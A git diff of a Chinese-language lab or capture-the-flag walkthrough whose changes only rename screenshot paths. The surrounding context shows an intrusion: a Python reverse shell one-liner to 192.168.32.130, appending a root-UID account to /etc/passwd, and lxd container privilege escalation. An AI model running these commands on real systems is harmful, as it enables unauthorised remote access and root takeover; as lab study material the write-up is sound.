@@ -28,11 +28,11 @@ Nmap done: 1 IP address (1 host up) scanned in 9.33 seconds
 
 访问80端口
 
-![image-20220907163331821](../../.gitbook/assets/image-20220907163331821.png)
+![image-20220907163331821](../../.gitbook/assets/image-20220907163331821-1675839964820892.png)
 
 访问8080端口
 
-![image-20220907163349662](../../.gitbook/assets/image-20220907163349662.png)
+![image-20220907163349662](../../.gitbook/assets/image-20220907163349662-1675839964820891.png)
 
 爆破目录
 
@@ -70,7 +70,7 @@ GENERATED WORDS: 4612
 
 访问`/debug`目录，可以执行命令
 
-![image-20220907163550050](../../.gitbook/assets/image-20220907163550050.png)
+![image-20220907163550050](../../.gitbook/assets/image-20220907163550050-1675839964820893.png)
 
 建立反弹shell
 
@@ -78,7 +78,7 @@ GENERATED WORDS: 4612
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.32.130",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-![image-20220907164024147](../../.gitbook/assets/image-20220907164024147.png)
+![image-20220907164024147](../../.gitbook/assets/image-20220907164024147-1675839964820894.png)
 
 查看sudo列表
 
@@ -109,7 +109,7 @@ openssl passwd -1 -salt hack pass123
 echo 'hack:$1$hack$22.CgYt2uMolqeatCk9ih/:0:0:root:/root:/bin/bash' >>/etc/passwd
 ```
 
-![image-20220907164925218](../../.gitbook/assets/image-20220907164925218.png)
+![image-20220907164925218](../../.gitbook/assets/image-20220907164925218-1675839964820895.png)
 
 lxd提权
 
@@ -126,7 +126,7 @@ python3 -m http.server 80
 lxd init
 ```
 
-![image-20220907165224854](../../.gitbook/assets/image-20220907165224854.png)
+![image-20220907165224854](../../.gitbook/assets/image-20220907165224854-1675839964820896.png)
 
 导入镜像
 
@@ -145,4 +145,4 @@ lxc start ignite
 lxc exec ignite /bin/sh
 ```
 
-![image-20220907165442559](../../.gitbook/assets/image-20220907165442559.png)
+![image-20230208150612010](../../.gitbook/assets/image-20230208150612010.png)
